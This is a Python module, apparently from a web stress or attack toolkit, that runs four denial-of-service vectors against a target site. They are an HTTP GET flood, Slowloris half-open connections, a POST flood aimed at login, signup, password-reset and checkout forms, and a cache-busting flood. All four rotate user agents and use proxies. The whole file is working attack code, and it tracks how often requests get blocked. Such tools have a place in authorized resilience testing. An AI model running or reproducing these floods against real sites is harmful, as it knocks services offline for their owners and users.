import logging
import random
import socket
import string
import time
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from typing import Optional
from urllib.parse import urlparse

import requests
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.columns import Columns
from rich import box

from .utils import console, log, now_utc, random_ua, phase_banner, get_proxy_dict

BLOCK_CODES = {403, 406, 429, 503}


class _Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.total = 0
        self.codes: dict[str, int] = {"200": 0, "403": 0, "429": 0, "503": 0, "error": 0}
        self.latencies: list[float] = []
        self.rps_samples: list[float] = []
        self._window_count = 0
        self._window_start = time.time()

    def record(self, code: int, latency_ms: float) -> None:
        with self._lock:
            self.total += 1
            self._window_count += 1
            key = str(code) if str(code) in self.codes else "error"
            self.codes[key] += 1
            self.latencies.append(latency_ms)
            now = time.time()
            if now - self._window_start >= 1.0:
                self.rps_samples.append(self._window_count / (now - self._window_start))
                self._window_count = 0
                self._window_start = now

    @property
    def rps_avg(self) -> float:
        return round(sum(self.rps_samples) / len(self.rps_samples), 1) if self.rps_samples else 0.0

    @property
    def rps_peak(self) -> float:
        return round(max(self.rps_samples), 1) if self.rps_samples else 0.0

    @property
    def lat_avg(self) -> float:
        return round(sum(self.latencies) / len(self.latencies), 1) if self.latencies else 0.0

    @property
    def lat_peak(self) -> float:
        return round(max(self.latencies), 1) if self.latencies else 0.0

    def _percentile(self, pct: float) -> float:
        if not self.latencies:
            return 0.0
        s = sorted(self.latencies)
        idx = min(int(len(s) * pct), len(s) - 1)
        return round(s[idx], 1)

    @property
    def lat_p50(self) -> float:
        return self._percentile(0.50)

    @property
    def lat_p95(self) -> float:
        return self._percentile(0.95)

    @property
    def lat_p99(self) -> float:
        return self._percentile(0.99)

    @property
    def blocked_pct(self) -> float:
        if not self.total:
            return 0.0
        blocked = sum(self.codes.get(str(c), 0) for c in (403, 429, 503))
        return round(blocked / self.total * 100, 1)


def _make_live_table(vector_name: str, elapsed: float, remaining: float, stats: _Stats) -> Table:
    table = Table(box=box.ROUNDED, title=f"[bold red]{vector_name}[/bold red]", expand=True)
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="bold white")

    table.add_row("Elapsed / Remaining", f"{elapsed:.0f}s / {max(0, remaining):.0f}s")
    table.add_row("Total Requests", str(stats.total))
    table.add_row("Live RPS (avg)", str(stats.rps_avg))
    table.add_row("Peak RPS", str(stats.rps_peak))
    table.add_row(
        "Responses",
        f"200:{stats.codes['200']}  403:{stats.codes['403']}  "
        f"429:{stats.codes['429']}  503:{stats.codes['503']}  ERR:{stats.codes['error']}"
    )
    table.add_row("Latency avg / p95 / p99", f"{stats.lat_avg} / {stats.lat_p95} / {stats.lat_p99} ms")
    table.add_row("Peak Latency", f"{stats.lat_peak} ms")

    pct = stats.blocked_pct
    color = "red" if pct > 50 else "yellow" if pct > 20 else "green"
    table.add_row("Blocked %", f"[{color}]{pct}%[/{color}]")
    return table


def _http_flood_worker(urls: list[str], stats: _Stats, stop_event: threading.Event,
                       target_rps: int, ramp_start: float, ramp_duration: float,
                       proxies: Optional[dict] = None) -> None:
    while not stop_event.is_set():
        elapsed = time.time() - ramp_start
        current_rps = (
            min(target_rps, int((elapsed / ramp_duration) * target_rps) + 1)
            if elapsed < ramp_duration else target_rps
        )
        delay = 1.0 / max(current_rps, 1)
        url = random.choice(urls)
        hdrs = {"User-Agent": random_ua()}
        t0 = time.time()
        try:
            r = requests.get(url, headers=hdrs, timeout=5, allow_redirects=False, proxies=proxies)
            stats.record(r.status_code, (time.time() - t0) * 1000)
        except Exception:
            stats.record(0, (time.time() - t0) * 1000)
        time.sleep(delay)


def vector_http_flood(target_url: str, discovered_urls: list[str], cfg: dict,
                      logger: Optional[logging.Logger] = None) -> dict:
    phase_banner("DDOS VECTOR 1: HTTP FLOOD")
    duration = cfg.get("duration", 60)
    target_rps = cfg.get("rps", 100)
    ramp = cfg.get("ramp_up_seconds", 30)
    threads = max(10, target_rps // 5)

    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    product_urls = [u for u in discovered_urls if "product" in u.lower() or "/p/" in u.lower()][:5]
    search_urls = [u for u in discovered_urls if "search" in u.lower()][:2]
    flood_urls = list({target_url} | set(product_urls) | set(search_urls)) or [target_url]

    stats = _Stats()
    stop_event = threading.Event()
    start = time.time()

    log(f"[HTTP FLOOD] Starting — target {target_rps} RPS | {duration}s | {threads} threads", "warning", logger)

    proxies = get_proxy_dict()
    with Live(console=console, refresh_per_second=2) as live:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(_http_flood_worker, flood_urls, stats, stop_event, target_rps, start, ramp, proxies)
            while time.time() - start < duration:
                elapsed = time.time() - start
                live.update(_make_live_table("HTTP FLOOD", elapsed, duration - elapsed, stats))
                time.sleep(0.5)
            stop_event.set()

    return _vector_result("http_flood", duration, stats)


def _slowloris_worker(host: str, port: int, use_ssl: bool, stats: _Stats,
                      stop_event: threading.Event) -> None:
    socks: list[socket.socket] = []
    try:
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                if use_ssl:
                    import ssl
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.send(f"GET /?{uuid.uuid4().hex} HTTP/1.1\r\nHost: {host}\r\n".encode())
                socks.append(s)
                stats.record(200, 0)
            except Exception:
                stats.record(0, 0)
            time.sleep(0.1)

        while not stop_event.is_set():
            for s in list(socks):
                try:
                    s.send(f"X-Header: {uuid.uuid4().hex}\r\n".encode())
                except Exception:
                    socks.remove(s)
            time.sleep(10)
    finally:
        for s in socks:
            try:
                s.close()
            except Exception:
                pass


def vector_slowloris(target_url: str, cfg: dict, logger: Optional[logging.Logger] = None) -> dict:
    phase_banner("DDOS VECTOR 2: SLOWLORIS")
    duration = cfg.get("duration", 60)
    max_conns = cfg.get("connections", 200)

    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    use_ssl = parsed.scheme == "https"
    port = parsed.port or (443 if use_ssl else 80)

    stats = _Stats()
    stop_event = threading.Event()
    start = time.time()

    log(f"[SLOWLORIS] Opening {max_conns} slow connections to {host}:{port}", "warning", logger)

    with Live(console=console, refresh_per_second=2) as live:
        with ThreadPoolExecutor(max_workers=max_conns) as ex:
            for _ in range(max_conns):
                ex.submit(_slowloris_worker, host, port, use_ssl, stats, stop_event)
            while time.time() - start < duration:
                elapsed = time.time() - start
                live.update(_make_live_table("SLOWLORIS", elapsed, duration - elapsed, stats))
                time.sleep(0.5)
            stop_event.set()

    return _vector_result("slowloris", duration, stats)


_FLOW_PAYLOADS: dict[str, dict] = {
    "login": {
        "email":    "test.user@example.com",
        "password": "Password123!",
    },
    "signup": {
        "email":            "newuser@example.com",
        "username":         "testuser" + str(random.randint(1000, 9999)),
        "password":         "Register123!",
        "confirm_password": "Register123!",
    },
    "password_reset": {
        "email": "forgot@example.com",
    },
    "checkout": {
        "card_number": "4111111111111111",
        "expiry":      "12/27",
        "cvv":         "123",
        "amount":      "99.99",
        "email":       "buyer@example.com",
    },
    "sales": {
        "name":    "Test User",
        "email":   "sales@example.com",
        "company": "TestCorp",
        "message": "I would like a quote.",
    },
}

_FLOW_KEYWORDS: dict[str, list[str]] = {
    "login":          ["login", "signin", "sign-in", "auth", "session"],
    "signup":         ["signup", "register", "sign-up", "create-account", "join"],
    "password_reset": ["forgot", "reset", "recover", "lost-password"],
    "checkout":       ["checkout", "cart", "basket", "bag", "purchase"],
    "sales":          ["pricing", "plans", "buy", "quote", "contact-sales"],
}


def _flow_for_url(url: str) -> str:
    lower = url.lower()
    for flow, kws in _FLOW_KEYWORDS.items():
        if any(kw in lower for kw in kws):
            return flow
    return "generic"


def _post_flood_worker(endpoints: list[str], stats: _Stats, stop_event: threading.Event,
                       proxies: Optional[dict] = None) -> None:
    while not stop_event.is_set():
        url = random.choice(endpoints)
        flow = _flow_for_url(url)
        if flow in _FLOW_PAYLOADS:
            payload = _FLOW_PAYLOADS[flow].copy()
        else:
            size = random.randint(128, 4096)
            payload = {"data": "".join(random.choices(string.ascii_letters + string.digits, k=size))}
        hdrs = {"User-Agent": random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
        t0 = time.time()
        try:
            r = requests.post(url, data=payload, headers=hdrs,
                              timeout=5, allow_redirects=False, proxies=proxies)
            stats.record(r.status_code, (time.time() - t0) * 1000)
        except Exception:
            stats.record(0, (time.time() - t0) * 1000)


def vector_post_flood(target_url: str, discovered_urls: list[str], cfg: dict,
                      classified_flows: Optional[dict] = None,
                      logger: Optional[logging.Logger] = None) -> dict:
    phase_banner("DDOS VECTOR 3: POST FLOOD")
    duration = cfg.get("duration", 60)
    threads = 20

    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Prefer real flow URLs discovered from the site crawl
    endpoints: list[str] = []
    if classified_flows:
        for flow_urls in classified_flows.values():
            endpoints.extend(flow_urls)

    # Supplement with keyword-matching from discovered_urls
    endpoint_keywords = ["checkout", "cart", "search", "login", "account", "signup", "register", "forgot", "reset"]
    for u in discovered_urls:
        if any(kw in u.lower() for kw in endpoint_keywords):
            endpoints.append(u)

    # Always add common guessed paths as fallback
    for path in ["/login", "/signup", "/forgot-password", "/cart", "/checkout", "/search", "/account"]:
        endpoints.append(base + path)

    endpoints = list(set(endpoints)) or [target_url]

    flow_summary = ", ".join(classified_flows.keys()) if classified_flows else "guessed paths"
    log(f"[POST FLOOD] Targeting {len(endpoints)} endpoints ({flow_summary}) | {threads} threads", "warning", logger)

    stats = _Stats()
    stop_event = threading.Event()
    start = time.time()

    proxies = get_proxy_dict()
    with Live(console=console, refresh_per_second=2) as live:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(_post_flood_worker, endpoints, stats, stop_event, proxies)
            while time.time() - start < duration:
                elapsed = time.time() - start
                live.update(_make_live_table("POST FLOOD", elapsed, duration - elapsed, stats))
                time.sleep(0.5)
            stop_event.set()

    return _vector_result("post_flood", duration, stats)


def _cache_buster_worker(urls: list[str], stats: _Stats, stop_event: threading.Event,
                         proxies: Optional[dict] = None) -> None:
    while not stop_event.is_set():
        url = random.choice(urls)
        buster = f"cb={uuid.uuid4().hex}&ts={int(time.time() * 1000)}"
        sep = "&" if "?" in url else "?"
        busted_url = f"{url}{sep}{buster}"
        hdrs = {"User-Agent": random_ua()}
        t0 = time.time()
        try:
            r = requests.get(busted_url, headers=hdrs, timeout=5, allow_redirects=False, proxies=proxies)
            stats.record(r.status_code, (time.time() - t0) * 1000)
        except Exception:
            stats.record(0, (time.time() - t0) * 1000)


def vector_cache_buster(target_url: str, discovered_urls: list[str], cfg: dict,
                        logger: Optional[logging.Logger] = None) -> dict:
    phase_banner("DDOS VECTOR 4: CACHE BUSTER")
    duration = cfg.get("duration", 60)
    threads = 20

    urls = list(set([target_url] + discovered_urls)) or [target_url]
    stats = _Stats()
    stop_event = threading.Event()
    start = time.time()

    log(f"[CACHE BUSTER] Bypassing cache on {len(urls)} URLs | {threads} threads", "warning", logger)

    proxies = get_proxy_dict()
    with Live(console=console, refresh_per_second=2) as live:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(_cache_buster_worker, urls, stats, stop_event, proxies)
            while time.time() - start < duration:
                elapsed = time.time() - start
                live.update(_make_live_table("CACHE BUSTER", elapsed, duration - elapsed, stats))
                time.sleep(0.5)
            stop_event.set()

    return _vector_result("cache_buster", duration, stats)


def _vector_result(name: str, duration: float, stats: _Stats) -> dict:
    return {
        "vector":           name,
        "duration_s":       duration,
        "total_requests":   stats.total,
        "rps_avg":          stats.rps_avg,
        "rps_peak":         stats.rps_peak,
        "latency_avg_ms":   stats.lat_avg,
        "latency_p50_ms":   stats.lat_p50,
        "latency_p95_ms":   stats.lat_p95,
        "latency_p99_ms":   stats.lat_p99,
        "latency_peak_ms":  stats.lat_peak,
        "responses":        dict(stats.codes),
        "blocked_pct":      stats.blocked_pct,
    }


def _pause_between(seconds: int) -> None:
    console.print(f"\n[cyan]  Pausing {seconds}s before next vector...[/cyan]")
    for i in range(seconds, 0, -1):
        console.print(f"  [{i}s remaining]", end="\r")
        time.sleep(1)
    console.print()


def run(
    target_url: str,
    discovered_urls: list[str],
    cfg: dict,
    classified_flows: Optional[dict] = None,
    logger: Optional[logging.Logger] = None,
) -> dict:
    pause = cfg.get("pause_between_vectors", 10)
    results: dict = {}

    results["http_flood"] = vector_http_flood(target_url, discovered_urls, cfg, logger)
    _pause_between(pause)

    results["slowloris"] = vector_slowloris(target_url, cfg, logger)
    _pause_between(pause)

    results["post_flood"] = vector_post_flood(target_url, discovered_urls, cfg, classified_flows, logger)
    _pause_between(pause)

    results["cache_buster"] = vector_cache_buster(target_url, discovered_urls, cfg, logger)

    return results
